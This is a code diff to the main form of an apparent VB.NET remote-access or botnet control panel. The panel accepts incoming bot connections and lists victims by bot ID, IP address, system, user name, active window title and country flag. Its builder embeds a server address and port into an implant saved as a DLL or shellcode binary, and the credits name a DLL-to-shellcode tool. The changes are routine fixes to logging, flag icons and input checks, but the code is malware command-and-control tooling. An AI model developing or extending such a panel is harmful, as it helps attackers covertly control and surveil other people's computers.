@@ -7,15 +7,15 @@ Public Class frmmain
     Public serverTCP As TcpListener
     Public clientMgr As clsClientMgr
 
-    Private Delegate Sub SafeLog(ByVal text As String)
-    Dim version As String = "0.1 Alpha"
+    Public Delegate Sub SafeLog(ByVal text As String)
+    Dim version As String = "0.1"
 
-    Public Sub Log(ByVal [txt] As String)
+    Public Sub Log(ByVal txt As String)
         If txtLog.InvokeRequired Then
             Dim d As New SafeLog(AddressOf Log)
-            Me.Invoke(d, New Object() {[txt]})
+            txtLog.Invoke(d, New Object() {txt})
         Else
-            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & [txt] & vbCrLf
+            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
         End If
     End Sub
 
@@ -27,9 +27,11 @@ Public Class frmmain
             .Sorting = SortOrder.Ascending
             .MultiSelect = False
             .HideSelection = False
+            .SmallImageList = ImFlag
+            '.LargeImageList = ImFlag
 
             'Add column header
-            .Columns.Add("Flag", 35)
+            .Columns.Add("Flag", 45)
             .Columns.Add("Bot ID", 100)
             .Columns.Add("IP Address", 150)
             .Columns.Add("System", 150)
@@ -66,14 +68,14 @@ Public Class frmmain
                     Dim clientTCP As TcpClient = listener.EndAcceptTcpClient(ar)
                     Dim clientObj As clsClientObj = New clsClientObj(clientTCP, mSettings.ServerSetting.password)
 
-                    Utilities.GlobalLog("There is a new connection")
+                    Log("There is a new connection from " & clientTCP.Client.RemoteEndPoint.ToString())
                     clientMgr.RegisterClient(clientObj)
                     Threading.Thread.Sleep(1)
                     serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
                 End If
             End If
         Catch ex As Exception
-            Utilities.GlobalLog("There is an error while accept connection: " & ex.Message)
+            Log("There is an error while accept connection: " & ex.Message)
             Return
         End Try
     End Sub
@@ -115,6 +117,9 @@ Public Class frmmain
         data(4) = clientInfo.computerUserName
         data(5) = clientInfo.WindowTitle
         Dim itm As ListViewItem = New ListViewItem(data)
+        Dim img As Image = Image.FromFile(Application.StartupPath + "\Flag\" + clientInfo.countryCode + ".png")
+        ImFlag.Images.Add(img)
+        itm.ImageIndex = ImFlag.Images.Count - 1
         lvClient.Items.Add(itm)
         Return True
     End Function
@@ -130,6 +135,10 @@ Public Class frmmain
         lvClient.Items.Item(index).SubItems.Item(3).Text = clientInfo.windowVersion
         lvClient.Items.Item(index).SubItems.Item(4).Text = clientInfo.computerUserName
         lvClient.Items.Item(index).SubItems.Item(5).Text = clientInfo.WindowTitle
+
+        Dim img As Image = Image.FromFile("Flag\" + clientInfo.countryCode + ".png")
+        ImFlag.Images(index) = img
+        lvClient.Items.Item(index).ImageIndex = index
 
         Return True
     End Function
@@ -194,11 +203,13 @@ Public Class frmmain
         ElseIf ClientList.Count < lvClient.Items.Count Then
             If ClientList.Count = 0 Then
                 lvClient.Items.Clear()
+                ImFlag.Images.Clear()
             Else
                 For Each item As ListViewItem In lvClient.Items
                     For Each client In ClientList
                         If client.GetClientInfo().botID <> item.SubItems(1).Text Or
                         client.GetClientInfo().computerUserName <> item.SubItems(4).Text Then
+                            ImFlag.Images.RemoveAt(item.Index)
                             lvClient.Items.Remove(item)
                         End If
                     Next
@@ -314,12 +325,13 @@ Public Class frmmain
                         "Coded by" & vbCrLf &
                         "Elvis" & vbCrLf & vbCrLf &
                         "Library" & vbCrLf &
+                        "VB.NET theme by aeonhack" & vbCrLf &
                         "zlib by Jean-loup Gailly and Mark Adler" & vbCrLf &
                         "zlibnet by gdalsnes" & vbCrLf &
                         "VC-LTL by Chuyu Team" & vbCrLf &
                         "DllToShellcode by Killeven" & vbCrLf & vbCrLf &
                         "Thank to" & vbCrLf &
-                        "None"
+                        ":P"
     End Sub
 
     Private Sub cmdBuild_Click(sender As Object, e As EventArgs) Handles cmdBuild.Click
@@ -327,10 +339,17 @@ Public Class frmmain
         If txtBuildServer.Text.Length >= 50 Then
             txtBuildLog.Text += "[-] IP/DnS too long (max 49)" & vbCrLf
             Return
+        ElseIf txtBuildServer.Text = "" Then
+            txtBuildLog.Text += "[-] IP/DnS is empty" & vbCrLf
+            Return
         Else
             txtBuildLog.Text += "[+] IP/DnS: " & txtBuildServer.Text & vbCrLf
         End If
-        If Convert.ToInt32(txtBuildPort.Text) > 65535 Then
+
+        If txtBuildPort.Text = "" Then
+            txtBuildLog.Text += "[-] Port is empty" & vbCrLf
+            Return
+        ElseIf Convert.ToInt32(txtBuildPort.Text) > 65535 Then
             txtBuildLog.Text += "[-] Invalid port" & vbCrLf
             Return
         Else
@@ -356,7 +375,7 @@ Public Class frmmain
         If buildBinary IsNot Nothing Then
             Dim saveDialog As New SaveFileDialog()
             saveDialog.Filter = "DLL files (*.dll)|*.dll|Bin files(*.bin)|*.bin|All files (*.*)|*.*"
-            saveDialog.FilterIndex = 2
+            saveDialog.FilterIndex = 1
             saveDialog.RestoreDirectory = True
             If saveDialog.ShowDialog() = DialogResult.OK Then
                 Dim fileStream As stream = saveDialog.OpenFile()
